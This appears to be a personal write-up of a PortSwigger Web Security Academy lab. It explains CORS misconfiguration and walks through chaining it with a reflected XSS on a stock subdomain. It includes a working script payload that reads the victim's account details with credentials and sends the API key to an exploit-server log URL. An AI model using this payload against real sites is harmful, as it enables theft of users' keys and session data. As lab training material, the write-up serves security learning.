# Approach

Describe your methodology, steps, and strategy for Cross-Origin Resource Sharing here.


What is CORS (cross-origin resource sharing)?
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

`GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...`

It then responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...`

These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.

Look for CORS Vuln
- Login to the lab with provided
- View the UI response of the My Accounts page, note the api key
- Add Origin: https://subdomain.vulnerable-website.com to the request to GET /accountDetails
- Note Access-Control-Allow-Credentials: true in response with the api keys
- Its not enough to see this vulnerability, we need to deliver the payload somehow

Look for XSS
- Observe that the product check stock is loaded with a subdomain
	- https://0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/product?productId=3
	* https://stock.0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/?productId=3&storeId=1
* Test the params productId and storeId for XSS
* productId is vulnerable to XSS
	* https://stock.0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/?productId=3%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
* Draft a script payload that uses the CORS vuln and XSS vuln payload
* Struggle with the encoding 
* Validate on self by storing exploit and viewing exploit in the burp browser
* Deliver exploit to user from exploit server

```
<script>

document.location="http://stock.0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a9200cf0461bfb180fa030500ac009f.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a4800b2040dbf6e80be022201890015.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

</script>
```

![[Pasted image 20250829132557.png]]

![[Pasted image 20250829132520.png]]

![[Pasted image 20250829141017.png]]
![[Pasted image 20250829141315.png]]